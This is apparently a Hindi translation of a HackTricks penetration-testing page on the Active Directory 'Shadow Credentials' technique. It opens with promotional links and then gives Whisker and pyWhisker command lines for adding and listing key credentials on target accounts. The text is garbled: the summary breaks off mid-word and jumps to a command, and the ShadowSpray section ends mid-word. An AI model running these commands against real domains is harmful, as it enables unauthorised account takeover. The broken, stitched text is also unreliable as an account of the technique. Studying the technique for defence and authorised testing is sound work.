# छाया क्रेडेंशियल्स

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**द पीएएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक पीएएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मेरा** ट्विटर 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें**।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>

## परिचय <a href="#3f17" id="3f17"></a>

**इस तकनीक के बारे में [सभी जानकारी के लिए मूल पोस्ट की जाँच करें](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)।**

**सारांश**: यदि आप किसी उपयोगकर्ता/कंप्यूटर के **msDS-KeyCredentialLink** गुण को लिख सकते हैं, तो आप उस ऑब्ज
```shell
Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
```
### [pyWhisker](https://github.com/ShutdownRepo/pywhisker)

यह **UNIX-आधारित सिस्टम** पर Whisker क्षमताओं को बढ़ाता है, Impacket और PyDSInternals का उपयोग करके पूर्ण शोषण क्षमताओं के लिए, जिसमें KeyCredentials की सूचीबद्धि, जोड़ना और हटाना शामिल है, साथ ही उन्हें JSON प्रारूप में आयात और निर्यात करना।
```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
```
### [शैडोस्प्रे](https://github.com/Dec0ne/ShadowSpray/)

शैडोस्प्रे का उद्देश्य है **डोमेन ऑब्ज
